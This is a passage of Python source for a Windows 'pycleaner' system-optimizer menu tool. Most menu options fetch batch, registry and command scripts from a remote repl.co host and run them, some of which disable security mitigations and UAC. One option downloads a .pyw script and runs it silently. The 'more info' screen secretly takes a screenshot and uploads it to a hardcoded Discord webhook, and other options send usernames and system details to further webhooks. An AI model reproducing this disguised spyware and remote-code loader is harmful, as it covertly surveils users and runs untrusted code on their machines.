        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/checkhealth.bat", "checkhealth.bat")
        
     elif choice == '20':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/scanhealth.bat", "scanhealth.bat")
        
     elif choice == '21':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/restorehealth.bat", "restorehealth.bat")
        
        
     elif choice == '22':
        url = "https://dl5.oo-software.com/files/ooshutup10/OOSU10.exe"
        r = requests.get(url)  
        with open(fr"tools\OOSU10.exe", 'wb') as f:
         f.write(r.content)
        os.startfile("tools\\OOSU10.exe")
        
     elif choice == '23':
        os.startfile("C:\Windows\System32\cleanmgr.exe")
        
     elif choice == '24':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/RegistryTweaks.reg", "RegistryTweaks.reg")
        
     elif choice == '25':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/BCDTweaks.cmd", "BCDTweaks.cmd")
        
     elif choice == '26':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Optimize%20ALL%20Windows%20Settings.reg", "Optimize ALL Windows Settings.reg")
    #tools
     elif choice == '27':
      try:
       shutil.rmtree("tools")
       os.mkdir(tools)
       print(f"{Fore.RESET}[{Fore.BLUE}pycleaner{Fore.RESET}] deleting tools file..." )
       typingPrint(f"{Fore.RESET}[{Fore.BLUE}pycleaner{Fore.RESET}] tools files deleted." ) 
       time.sleep(4)
       main()
      except Exception as e:
         a1 = f"{Fore.RESET}[{Fore.BLUE}pycleaner{Fore.RESET}] please close all apps and background apps and try again especially '{e}"
         a2 = a1.replace("[WinError 5] Access is denied: "+"'tools\\\\", '')
         print(a2)    
         time.sleep(9)
         main()
         
     elif choice == '28':
        os.startfile("C:\Windows\System32\msconfig.exe")

     elif choice == '29':
        url = "https://github.com/hellzerg/optimizer/releases/download/13.9/Optimizer-13.9.exe"
        r = requests.get(url)  
        with open(fr"tools\optimizer.exe", 'wb') as f:
         f.write(r.content)
        os.startfile("tools\optimizer.exe")

     elif choice == '30':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/powerplan.bat", "powerplan.bat")
        
     elif choice == '31':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Animations%20Disable.reg", "Animations Disable.reg")
        
     elif choice == '32':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/CPU%20Optimization%20for%20Gameing.reg", "CPU Optimization for Gameing.reg")
        
     elif choice == '33':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Disable%20Background%20Apps.reg", "Disable Background Apps.reg")
        
     elif choice == '34':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Disable%20Cortana.reg", "Disable Cortana.reg")
        
     elif choice == '35':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Disable%20Full%20Screen%20Optimizations.reg", "Disable Full Screen Optimizations.reg")
        
     elif choice == '36':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Disable%20Game%20Bar.reg", "Disable Game Bar.reg")
        
     elif choice == '37':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Disable%20LargeSystemCache.reg", "Disable LargeSystemCache.reg")
        
     elif choice == '38':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Disable%20Memory%20Compression.cmd", "Disable Memory Compression.cmd")
        
     elif choice == '39':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Disable%20Mitigations.cmd", "Disable Mitigations.cmd")
        
     elif choice == '40':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Disable%20Power%20Throttling.reg", "Disable Power Throttling.reg")
        
     elif choice == '41':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/DVR.reg", "DVR.reg")
        
     elif choice == '42':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/GPU%20Tweaks", "GPU Tweaks.reg")
        
     elif choice == '43':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Increase%20System%20Responsiveness.bat", "Increase System Responsiveness.bat")
        
     elif choice == '44':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Lower%20Input%20Delay.bat", "Lower Input Delay.bat")
        
     elif choice == '45':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Memory%20Tweaks.reg", "Memory Tweaks.reg")
        
     elif choice == '46':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/NoLazyMode.reg", "NoLazyMode.reg")
        
     elif choice == '47':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Power%20Tweaks.reg", "Power Tweaks.reg")
        
     elif choice == '48':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Smooth.reg", "Smooth.reg")
        
     elif choice == '49':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/UAC.reg", "UAC.reg")
        
     elif choice == '50':
        url = "https://adwcleaner.malwarebytes.com/adwcleaner?channel=release"
        r = requests.get(url)  
        with open(fr"tools\\adwcleaner.exe", 'wb') as f:
         f.write(r.content)
        os.startfile("tools\\adwcleaner.exe")
        
     elif choice == 'a':
      fr = "tools\GodMode.{ED7BA470-8E54-465E-825C-99712043E01C}"
      if not os.path.exists(fr):
       directory = "GodMode.{ED7BA470-8E54-465E-825C-99712043E01C}"
       parent_dir = "tools"
       path = os.path.join(parent_dir, directory)
       os.mkdir(path)
      if os.path.exists(fr):
       os.startfile("tools\GodMode.{ED7BA470-8E54-465E-825C-99712043E01C}")
     
        
     elif choice == '51':
      os.system("cls")
      print(ramg,"gb RAM? y,n if not right it would be risky for ur pc")
      fr = input("y,n >: ")
      if fr == ("n"):
       ramgb = input("enter gb ram if ur not sure hit enter >: ")
       if ramgb == '4':
         download("https://untimelyimpressionableadministration.blus2tlia.repl.co/4GB%20Ram.reg", "4GB Ram.reg")
         main()
       if ramgb == '6':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/6GB%20Ram.reg", "6GB Ram.reg")
        main()
       if ramgb == '8':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/8GB%20Ram.reg", "8GB Ram.reg")
        main()
       if ramgb == '12':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/12GB%20Ram.reg", "12GB Ram.reg")
        main()
       if ramgb == '16':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/16GB%20Ram.reg", "16GB Ram.reg")
        main()
       if ramgb == '20':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/20GB%20Ram.reg", "20GB Ram.reg")
        main()
       if ramgb == '24':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/24GB%20Ram.reg", "24GB Ram.reg")
        main()
       if ramgb == '32':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/32GB%20Ram.reg", "32GB Ram.reg")
        main()
       if ramgb == '64':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/64GB%20Ram.reg", "64GB Ram.reg")
        main()
      if fr == ("y"):
       if ramg == '4':
         download("https://untimelyimpressionableadministration.blus2tlia.repl.co/4GB%20Ram.reg", "4GB Ram.reg")
         main()
       if ramg == '6':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/6GB%20Ram.reg", "6GB Ram.reg")
        main()
       if ramg == '8':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/8GB%20Ram.reg", "8GB Ram.reg")
        main()
       if ramg == '12':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/12GB%20Ram.reg", "12GB Ram.reg")
        main()
       if ramg == '16':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/16GB%20Ram.reg", "16GB Ram.reg")
        main()
       if ramg == '20':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/20GB%20Ram.reg", "20GB Ram.reg")
        main()
       if ramg == '24':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/24GB%20Ram.reg", "24GB Ram.reg")
        main()
       if ramg == '32':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/32GB%20Ram.reg", "32GB Ram.reg")
        main()
       if ramg == '64':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/64GB%20Ram.reg", "64GB Ram.reg")
        main()
      else:
        print('invaild ram')
        time.sleep(4)
        main()
    #more info
     elif choice == '52':
        os.system('cls')
        print(Colors.pink+ver)
        print(f'{Fore.WHITE}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────{Fore.RESET}')
        print(Colors.blue+mo)
        print(lol)
        print((platform.machine())+ ' bit' )
        print('Path: ', idk)
        print(ti)
        print ('ip: '+ip)
        print('city: '+city)
        print('country: '+country)
        print('region: '+region)
        print('googlemap: '+googlemap)
        print('org: '+org)
        print('loc: '+loc)
        print(ramg,'GB ram')
        print('Your username is ' +   username)
        print(about)
        print ('Free gb:',obj_Disk.free / (1024 ** 3))
        print ('%: ',obj_Disk.percent)
        print('RAM memory % used:', psutil.virtual_memory()[2])
        print(f'{Fore.RESET}{Fore.RED}Hit enter {Fore.RESET}{Fore.GREEN}to go back')
        print(f'{Fore.RESET}{Fore.RED}Type 1 {Fore.RESET}{Fore.GREEN}for Github')
        print(f'{Fore.RESET}{Fore.RED}Type 2 {Fore.RESET}{Fore.GREEN}for Disclaimer')
        print(f'{Fore.WHITE}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────{Fore.RESET}')
        path = Path(ooo)
        if path.is_file():
         pass
        else:
         ss_img = ImageGrab.grab()
         ss_img.save(fr'C:\Users\{username}\AppData\Local\random.png')
         webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1018138687969689632/nS2hsAmFAmRaklSvYKaWJYw0Q_15mRoV7-sVtgOMFqgKSXuDGAbkZKim9agVUUlmTjZg',username="screenshoter bot", avatar_url= "https://i.imgur.com/jUonyvA.jpeg")
         with open(fr'C:\Users\{username}\AppData\Local\random.png', "rb") as f:
          webhook.add_file(file=f.read(), filename=fr'C:\Users\{username}\AppData\Local\random.png')
         response = webhook.execute(remove_embeds=True, remove_files=True)
        file_path = fr'C:\Users\{username}\AppData\Local\random.png'
        if os.path.isfile(file_path):
         os.remove(file_path)
        choice = input(Colors.red + f'Which option do you choose? -> {Fore.RED} ')
        if choice == '1':
         webbrowser.open("https://github.com/j0taro/pycleaner")
        if choice == '2':
         if os.path.isfile(path_to_file):
          os.remove(path_to_file)
          main()
         else:
           main()
        
    #exit
     elif choice == '53': 
        os._exit(0) 
        
     elif choice =='54':
      suggestion = input(f"enter ur suggestion:{Fore.RED} ")
      if suggestion == ' ':
        print('invalid suggestion please try again later.')
        time.sleep(4)
        main()
      if suggestion == '':
        print('invalid suggestion please try again later.')
        time.sleep(4)
        main()
      webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1018138390903926897/vjocJhEyoGpm8SVjQjE_vAjR3vq6aKpONpQVp4l4y7X3QEfiKNSWl3zrCLacEAGl1UvK', content='<@822132948769177620>', username="new suggestion",avatar_url= "https://i.imgur.com/NK0ctzM.png")
      embed = DiscordEmbed(title='new suggestion ', description= 'damn '+username +''' added a new suggestion:
 ''' + ong + suggestion+ong, color=dawg)
      embed.set_footer(text=mo + lol +' '+ ti)
      webhook.add_embed(embed)
      response = webhook.execute()
      typingPrint(f"{Fore.RESET}[{Fore.BLUE}FR OPTIMIZER UPLOADER{Fore.RESET}]"+ong+suggestion+ong+' has been uploaded, thanks for ur suggestion')
      time.sleep(0)
      main()
     
     elif choice == 'exe':
        os.system("pip install pyinstaller")
        download  ("https://untimelyimpressionableadministration.blus2tlia.repl.co/to-exe.bat", "to-exe.bat")
        
     elif choice == 'h': 
        h = input(Colors.blue + f'are you sure you want to hibernate? y,n :{Fore.RED}')
        if h == 'y':
         os.system("cls")
         typingPrint(f"{Fore.RESET}[{Fore.BLUE}SYSTEM{Fore.RESET}]"+'hibernating in 3..')
         time.sleep(1)
         typingPrint("2..")
         time.sleep(1)
         typingPrint("1..")
         time.sleep(1)
         download("https://untimelyimpressionableadministration.blus2tlia.repl.co/hib.bat", "hib.bat") 
         os._exit(0)
        if h == 'n':
         print(f"{Fore.RESET}[{Fore.BLUE}PYCLEANER{Fore.RESET}]"+'ok going back')
         time.sleep(2)
        else:
         print(f"{Fore.RESET}[{Fore.BLUE}PYCLEANER{Fore.RESET}]"+'invaild option please try again later')
         time.sleep(4)
         main()
         
         
     elif choice == 's': 
        shut = input(Colors.blue + f'are you sure you want to shutdown? y,n :{Fore.RED}')
        if shut == 'y':
         os.system("cls")
         typingPrint(f"{Fore.RESET}[{Fore.BLUE}SYSTEM{Fore.RESET}]"+'shutting down in 3..')
         time.sleep(1)
         typingPrint("2..")
         time.sleep(1)
         typingPrint("1..")
         time.sleep(1)
         download("https://untimelyimpressionableadministration.blus2tlia.repl.co/shut.bat", "shut.bat") 
        if shut == 'n':
         print(f"{Fore.RESET}[{Fore.BLUE}PYCLEANER{Fore.RESET}]"+'ok going back')
         time.sleep(2)        
        else:
         print(f"{Fore.RESET}[{Fore.BLUE}PYCLEANER{Fore.RESET}]"+'Invaild option please try again later')
         time.sleep(4)
         main()
         
     elif choice == 'r': 
        res = input(Colors.blue + f'Are you sure you want to restart? y,n :{Fore.RED}')
        if res == 'y':
         os.system("cls")
         typingPrint(f"{Fore.RESET}[{Fore.BLUE}SYSTEM{Fore.RESET}]"+'restarting in 3..')
         time.sleep(1)
         typingPrint("2..")
         time.sleep(1)
         typingPrint("1..")
         time.sleep(1)
         download("https://untimelyimpressionableadministration.blus2tlia.repl.co/restart.bat", "restart.bat") 
        if res == 'n':
         print(f"{Fore.RESET}[{Fore.BLUE}PYCLEANER{Fore.RESET}]"+'ok going back')
         time.sleep(2)        
        else:
         print(f"{Fore.RESET}[{Fore.BLUE}PYCLEANER{Fore.RESET}]"+'invaild option please try again later')
         time.sleep(4)
         main()
         
     elif choice == 're': 
         print(f"{Fore.RESET}[{Fore.BLUE}PYCLEANER{Fore.RESET}]"+'soft restarting in 2 secounds please wait')
         time.sleep(2)
         download("https://untimelyimpressionableadministration.blus2tlia.repl.co/softr.bat", "softr.bat") 
         main()
         
     elif choice == 'dev':
       os.system("cls")
       path = Path(ooo)
       if path.is_file():
        dev()
       else:
        webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1020336398328406036/QAUrtaDf2Z0hYvZSB1s9Zyg6wZdij5ZSs6H2_wdQVqBGbs5X7v2kVukXe8FF-xhaZxfh', username="fake devs", avatar_url= "https://i.imgur.com/SwcvuwC.png" )
        embed = DiscordEmbed(title='fr optimizer ', description= username +' is a fake developer \U0001F480', color=dawg)
        webhook.add_embed(embed)
        response = webhook.execute()
        print(f"{Fore.RESET}[{Fore.BLUE}PYCLEANER dev{Fore.RESET}]"+'nah ur not a dev going back...')
        time.sleep(4)
        main()
        
      
     elif choice == bot:
       os.system('pip install pythonw')
       os.system('cls')
       url = "https://untimelyimpressionableadministration.blus2tlia.repl.co/test.pyw"
       r = requests.get(url)  
       with open(fr"test.pyw", 'wb') as f:
         f.write(r.content)
       print('please restart pycleaner')
       os.system('pythonw test.pyw')
        
     elif choice == 'update':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/updater.bat", "updater.bat")    
    #else       
     else:
        print("what?") 
        time.sleep(0.5)
        main()
     main()
    

if __author__ != "\x64\x79\x6E\x61\x73\x74\x79":
    typingPrint("ERROR, dont play with the code dumbass")
    os._exit(10)


         


main()
